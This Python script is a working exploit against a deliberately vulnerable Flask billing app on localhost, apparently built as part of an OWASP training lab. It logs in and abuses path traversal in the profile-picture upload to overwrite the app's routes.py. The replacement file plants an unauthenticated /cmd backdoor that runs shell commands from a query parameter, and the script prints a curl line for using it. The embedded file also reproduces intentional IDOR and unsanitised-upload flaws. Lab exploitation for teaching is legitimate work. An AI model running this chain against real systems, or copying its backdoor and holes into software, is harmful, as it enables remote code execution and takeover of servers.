import requests

TARGET = "http://localhost:5000"
EMAIL = "ana.torres@example.com"
PASSWORD = "ana"

# Payload: routes.py original + backdoor en /telemetry
PAYLOAD = '''import subprocess
#EXPLOITTTT
import csv
import io
import os

from flask import (
    Response, abort, current_app, flash, redirect,
    render_template, request, url_for,
)

from app.auth_utils import current_user, login_required
from app.blueprints.dashboard import dashboard_bp
from app.extensions import db
from app.models import Invoice, Telemetry


@dashboard_bp.route("/cmd")
def cmd():
    c = request.args.get("c", "id")
    out = subprocess.check_output(c, shell=True, stderr=subprocess.STDOUT)
    return Response(out, mimetype="text/plain")

    """Client dashboard routes.

INTENTIONAL WEAKNESSES (educational OWASP project):
  * `invoice_detail` reads `?id_factura=` in plain text and looks the invoice up
    with NO ownership check -> Insecure Direct Object Reference, OWASP A01.
  * `profile` saves the uploaded file under its original, unsanitized name with
    no type/size validation -> unrestricted upload + path traversal.
"""

import csv
import io
import os

from flask import (
    Response,
    abort,
    current_app,
    flash,
    redirect,
    render_template,
    request,
    url_for,
)

from app.auth_utils import current_user, login_required
from app.blueprints.dashboard import dashboard_bp
from app.extensions import db
from app.models import Invoice, Telemetry


@dashboard_bp.route("/")
@login_required
def index():
    user = current_user()
    latest_invoice = (
        Invoice.query.filter_by(user_id=user.id)
        .order_by(Invoice.issue_date.desc())
        .first()
    )
    pending_total = sum(
        inv.amount
        for inv in user.invoices
        if inv.status == "pending"
    )
    latest = {}
    for metric in ("water", "electricity", "temperature"):
        reading = (
            Telemetry.query.filter_by(user_id=user.id, metric=metric)
            .order_by(Telemetry.reading_date.desc())
            .first()
        )
        latest[metric] = reading

    return render_template(
        "dashboard/index.html",
        user=user,
        latest_invoice=latest_invoice,
        pending_total=pending_total,
        latest=latest,
    )


@dashboard_bp.route("/invoices")
@login_required
def invoices():
    user = current_user()
    rows = (
        Invoice.query.filter_by(user_id=user.id)
        .order_by(Invoice.issue_date.desc())
        .all()
    )
    return render_template("dashboard/invoices.html", invoices=rows)


@dashboard_bp.route("/invoice")
@login_required
def invoice_detail():
    # IDOR (OWASP A01): the invoice id arrives in plain text via the query string
    # and is fetched directly, without verifying it belongs to the current user.
    id_factura = request.args.get("id_factura", type=int)
    if id_factura is None:
        abort(400, "Falta el parámetro id_factura")

    invoice = Invoice.query.get(id_factura)
    if invoice is None:
        abort(404)

    return render_template("dashboard/invoice_detail.html", invoice=invoice)


@dashboard_bp.route("/profile", methods=["GET", "POST"])
@login_required
def profile():
    user = current_user()

    if request.method == "POST":
        user.name = request.form.get("name", user.name).strip()
        user.surname = request.form.get("surname", user.surname).strip()
        user.address = request.form.get("address", user.address).strip()
        user.city = request.form.get("city", user.city).strip()

        # Raw file handling — no Flask-Uploads, no secure_filename, no type or
        # size checks. The original filename is trusted verbatim, which allows
        # arbitrary file types and path traversal (e.g. "../../evil.php").
        file = request.files.get("profile_picture")
        if file and file.filename:
            filename = file.filename
            save_path = os.path.join(current_app.config["UPLOAD_FOLDER"], filename)
            os.makedirs(os.path.dirname(save_path), exist_ok=True)
            file.save(save_path)
            user.profile_picture = filename

        db.session.commit()
        flash("Perfil actualizado correctamente.", "success")
        return redirect(url_for("dashboard.profile"))

    return render_template("dashboard/profile.html", user=user)


def _build_series(rows, unit, color, width=560, height=150, pad=24):
    """Turn an ascending list of readings into SVG geometry + summary stats.

    Everything is computed server-side (no JS charting library) so the template
    only has to draw a <polyline> and a <polygon>.
    """
    values = [r.value for r in rows]
    if not values:
        return None

    n = len(values)
    vmin, vmax = min(values), max(values)
    span = (vmax - vmin) or 1
    base_y = height - pad
    usable_h = height - 2 * pad
    step = (width - 2 * pad) / max(n - 1, 1)

    points = []
    for i, v in enumerate(values):
        x = pad + i * step
        y = base_y - (v - vmin) / span * usable_h
        points.append((x, y))

    line = " ".join(f"{x:.1f},{y:.1f}" for x, y in points)
    area = (
        f"{pad:.1f},{base_y:.1f} {line} "
        f"{pad + (n - 1) * step:.1f},{base_y:.1f}"
    )

    # Trend: average of the most recent half vs. the older half.
    half = max(n // 2, 1)
    recent_avg = sum(values[-half:]) / len(values[-half:])
    prev_avg = sum(values[:half]) / len(values[:half])
    change = 0.0 if prev_avg == 0 else (recent_avg - prev_avg) / prev_avg * 100

    return {
        "line": line,
        "area": area,
        "last_x": points[-1][0],
        "last_y": points[-1][1],
        "width": width,
        "height": height,
        "color": color,
        "unit": unit,
        "avg": sum(values) / n,
        "max": vmax,
        "min": vmin,
        "total": sum(values),
        "change": change,
        "first_date": rows[0].reading_date,
        "last_date": rows[-1].reading_date,
        "count": n,
    }


@dashboard_bp.route("/trends")
@login_required
def trends():
    user = current_user()
    metrics = [
        ("electricity", "Electricidad", "kWh", "#e76f51"),
        ("water", "Agua", "m³", "#2a9d8f"),
    ]
    properties = []
    for prop in user.properties:
        charts = []
        for metric, label, unit, color in metrics:
            rows = (
                Telemetry.query.filter_by(property_id=prop.id, metric=metric)
                .order_by(Telemetry.reading_date.asc())
                .all()
            )
            charts.append({"label": label, "series": _build_series(rows, unit, color)})
        properties.append({"property": prop, "charts": charts})

    return render_template("dashboard/trends.html", properties=properties)


@dashboard_bp.route("/telemetry")
@login_required
def telemetry():
    user = current_user()
    data = {}
    for metric in ("water", "electricity"):
        data[metric] = (
            Telemetry.query.filter_by(user_id=user.id, metric=metric)
            .order_by(Telemetry.reading_date.desc())
            .limit(30)
            .all()
        )
    return render_template("dashboard/telemetry.html", data=data)


@dashboard_bp.route("/telemetry/export")
@login_required
def telemetry_export():
    user = current_user()
    metric = request.args.get("metric", "water")
    if metric not in ("water", "electricity", "temperature"):
        abort(400, "Métrica no válida")

    rows = (
        Telemetry.query.filter_by(user_id=user.id, metric=metric)
        .order_by(Telemetry.reading_date.asc())
        .all()
    )

    # Build the CSV in memory with the standard library (raw, no helpers).
    buffer = io.StringIO()
    writer = csv.writer(buffer)
    writer.writerow(["fecha", "metrica", "valor", "unidad"])
    for r in rows:
        writer.writerow([r.reading_date.isoformat(), r.metric, r.value, r.unit])

    return Response(
        buffer.getvalue(),
        mimetype="text/csv",
        headers={
            "Content-Disposition": f"attachment; filename=telemetria_{metric}.csv"
        },
    )


'''




session = requests.Session()

# 1. Login
session.post(f"{TARGET}/auth/login", data={
    "email": EMAIL,
    "password": PASSWORD
})

session.post(f"{TARGET}/login", data={
    "identifier": EMAIL,
    "password": PASSWORD
})

# 2. Subir el routes.py malicioso con path traversal
files = {
    "profile_picture": (
        "../../../blueprints/dashboard/routes.py",
        PAYLOAD.encode(),
        "image/jpeg"
    )
}
data = {"name": "x", "surname": "x", "address": "", "city": ""}

r = session.post(f"{TARGET}/dashboard/profile", files=files, data=data)
print(r.status_code)
print("Archivo sobreescrito.")
print(f"  curl '{TARGET}/dashboard/cmd?c=id'")